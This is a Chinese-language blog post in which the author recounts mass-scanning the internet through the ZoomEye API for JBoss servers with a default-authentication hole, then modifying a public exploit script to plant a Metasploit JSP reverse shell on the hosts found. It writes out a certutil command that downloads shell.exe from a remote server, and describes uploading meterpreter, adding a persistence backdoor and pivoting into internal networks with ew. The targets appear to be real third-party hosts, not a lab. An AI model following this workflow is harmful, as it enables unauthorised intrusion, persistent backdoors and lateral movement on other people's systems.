文章缘起于github上的一个jboss利用代码[https://github.com/yuxiaokui/JBoss-Hack](https://github.com/yuxiaokui/JBoss-Hack)
人家还给了一个简单的UIshell界面 不过，好难用的说这个后面再说
这个漏洞就是JBoss的默认身份验证漏洞，都不用登录的说，直接去网上扫就好了
那么问题来了，原作者写的一句话jsp的后门菜刀连不上，蚁剑不支持jsp，这就尴尬了，不过还好人家代码挺少，只能乖乖修改源码去了。
![](https://github.com/0linlin0/Records/blob/master/images/jb1.png?raw=true)
原作者调用了zoomeye的api，然后构造exp，发送get请求，并验证在这里我们可以修改exp，我们强大的msf可以生成payload，用的是 payload/java/jsp_shell_reverse_tcp ，生成的代码不太多，因为漏洞利用的时候需要将代码url编码后放到get请求里，所以这里就悲催了，尽量压缩代码把。msf心比它提供的UIshell界面好用多了。谁让我java很烂呢:(
生成payload并进行url编码，修改exp，然后运行修改后的脚本

![](https://github.com/0linlin0/Records/blob/master/images/jb2.png)

得到存在漏洞的主机列表

![](https://github.com/0linlin0/Records/blob/master/images/jb3.png)


Msf端设置监听端口，等待回连，访问链接，回连成功


![](https://github.com/0linlin0/Records/blob/master/images/jb4.png)

Yes！拿到了webshell，我就想拿meterpreter，首先得上传payload，所以我又去搜，windows命令行下怎么样下载远程文件，得到了好多结果

[http://www.4hou.com/system/8661.html](http://www.4hou.com/system/8661.html)

[http://www.freebuf.com/articles/system/155147.html](http://www.freebuf.com/articles/system/155147.html) 
[结果3](http://wps2015.org/drops/drops/%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%8415%E7%A7%8D%E6%96%B9%E6%B3%95.html)

嗯。。我想说搜到了这么多，我只用了一个certutil
在webshell上运行这个命令
certutil.exe -urlcache -split -f https：//a.com/shell.exe
[certutil.exe利用](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/)
嘻嘻嘻，原谅我的懒惰，剩下的好多看不懂。。。所以以后慢慢唉，总会又用到的时候
所以我再vps上搭建了一个web服务，这样就可以啦，我的meterperter上传上去啦！所以我得到更高级的shell啦，而且还可以是长期的!说到这里，又遇到两个问题：
首先是上出啊的payload免杀的问题，还有是持久后门的问题，这一搜，打开了新世界的大门。这里留个坑，以后好好研究这里的内容。因为我比较幸运，目标上没有任何防护，不涉及到免杀，而且meterpreter自带的持久后门run persistence暂时就蛮好用的，虽然官方不推荐了，不过我们先凑活着用，毕竟只是练练手，嘻嘻。
然后就进入到进入内网的问题了，ew人家更新了（http://rootkiter.com/Termite/）看了人家的视频，真的是好好用，我太菜了，一直不成功，是不是Termite只支持正向socks..应该不会吧，所以只能先用着ew了。。。伤心当中。
关于Termite的使用不成功


![](https://github.com/0linlin0/Records/blob/master/images/jb5.png)


上传成功后msf监听端口，等待回连，回连成功

![](https://github.com/0linlin0/Records/blob/master/images/jb6.png)
